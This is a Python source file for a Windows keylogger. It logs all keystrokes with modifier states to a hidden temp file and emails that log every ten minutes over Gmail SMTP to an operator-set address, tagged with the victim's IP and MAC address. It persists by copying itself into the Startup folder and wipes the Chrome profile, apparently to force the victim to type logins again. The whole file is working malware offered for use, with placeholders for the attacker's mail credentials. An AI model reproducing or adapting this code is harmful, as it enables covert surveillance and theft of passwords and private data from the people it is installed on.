import sys
import os.path
import uuid
import tempfile
import smtplib
import threading
import shutil
import socket
import json
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
from pathlib import Path
from os.path import expanduser

TIMESTAMP = time.time()
HOME = expanduser("~")
NEW_FOLDER_IN_TEMP = str(tempfile.gettempdir() + "\TCD78")  # folder name
folder = HOME + r'\AppData\Local\Google\Chrome\User Data\Default'
STARTUP_FOLDER = HOME + r"\AppData\Roaming\Microsoft\Windows\Start " \
                               r"Menu\Programs\Startup"
PATH_TO_TXT = Path(NEW_FOLDER_IN_TEMP + "\liedog.txt")

email = 'MAIL'  # Your email
password = 'PWD TO MAIL'  # Your email account password
send_to_email = 'YOUR DESTINATION'  # Destinaition email

ctrl_state = False
shift_state = False
alt_state = False

def delete_chrome_coockies():
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception:
            pass

def copy_to_autoload(sorc, dest):
    try:
        shutil.copy(sorc, dest)
    except Exception:
        pass


# function to send keylog.txt to email
def sender():
    subject = socket.gethostbyname(socket.gethostname()) + "_" + hex(
        uuid.getnode())  # Subj of massege
    message = 'logfileupdate'  # text of message
    file_location = NEW_FOLDER_IN_TEMP + '/liedog.txt'  # Path to file

    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = send_to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(message, 'plain'))

    # Setup the attachment
    filename = os.path.basename(file_location)
    attachment = open(file_location, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" %
                    filename)

    # Attach the attachment to the MIMEMultipart object
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, send_to_email, text)
    server.quit()

def timer():
    try_to_send()
    threading.Timer(600, timer).start()

def try_to_send():
    try:
        sender()
    except Exception:
        pass


def on_press(key):
    global pressed
    global shift_state
    global ctrl_state
    global alt_state

    if str(key) == "Key.shift":
        shift_state = True

    elif str(key) == "Key.ctrl_l":
        ctrl_state = True

    elif str(key) == "Key.alt_l":
        alt_state = True

    else:

        pressed = {
            "ts": TIMESTAMP,
            "key": ' ' if str(key) == "Key.space" else str(key),
            "sft": shift_state,
            "ctrl": ctrl_state,
            "alt": alt_state
            }
        write_press()


def on_release(key):
    global shift_state
    global ctrl_state
    global alt_state

    if str(key) == "Key.shift":
        shift_state = False

    elif str(key) == "Key.ctrl_l":
        ctrl_state = False

    elif str(key) == "Key.alt_l":
        alt_state = False

    else:

        write_released()

def write_press():
    with open(NEW_FOLDER_IN_TEMP + "\liedog.txt", 'a') as json_file:
        json.dump(pressed, json_file)
def write_released():
    with open(NEW_FOLDER_IN_TEMP + "\liedog.txt", 'a') as json_file:
        json_file.write("released" + "\n")

if __name__ == "__main__":

    copy_to_autoload(sys.executable, STARTUP_FOLDER)

    try:
        os.mkdir(NEW_FOLDER_IN_TEMP)
    except Exception:
        pass

    if PATH_TO_TXT.is_file():
        open(NEW_FOLDER_IN_TEMP + "\liedog.txt", "w").close()
    else:
        delete_chrome_coockies()

    timer()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
